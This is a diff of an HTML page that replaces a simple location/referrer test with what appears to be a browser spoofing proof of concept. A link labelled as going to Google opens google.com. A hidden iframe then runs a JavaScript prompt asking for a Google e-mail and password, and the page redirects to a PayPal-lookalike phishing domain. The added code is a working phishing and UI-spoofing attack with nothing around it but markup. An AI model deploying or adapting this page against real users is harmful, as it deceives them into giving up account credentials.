@@ -1,14 +1,26 @@
-<body>
+<html>
+  <body>
+
     <script>
-        if (document.cookie.includes('here=1')) {
-            document.cookie = "here=0";
-            alert('This is not localhost:3000, real location:' + location);
-        } else {
-            document.cookie = 'here=1';
-            alert('I am going .back(), real location' + location);
-            history.back();
-        }
-        document.write('<h1>' + location + '</h1>')
+
+    function exploit() {
+
+      window.open("https://www.google.com");
+
+      document.getElementById("iframe").src = 'javascript:prompt("In order to access Google.com\\nyou must first login on your\\nGoogle Account.\\n\\nPlease type your e-mail\\nand your password:\\n", "E-mail / Password");';
+      document.location="http://www.manage-myaccount.paypal.com-webapps.bntk.pl";
+
+    }
+    
     </script>
-    <a href="https://www.whatismyreferer.com/" /> What's my referrer?</a>
-</body>
+
+    <br><br><br><br>
+
+    <a href="#" onclick="exploit();">
+      <center><h1>Click here to go to Google.com</h1></center>
+    </a>
+
+    <iframe styleframeborder="0" style="width:0;height:0;" id="iframe" src=""></iframe>
+
+  </body>
+</html>
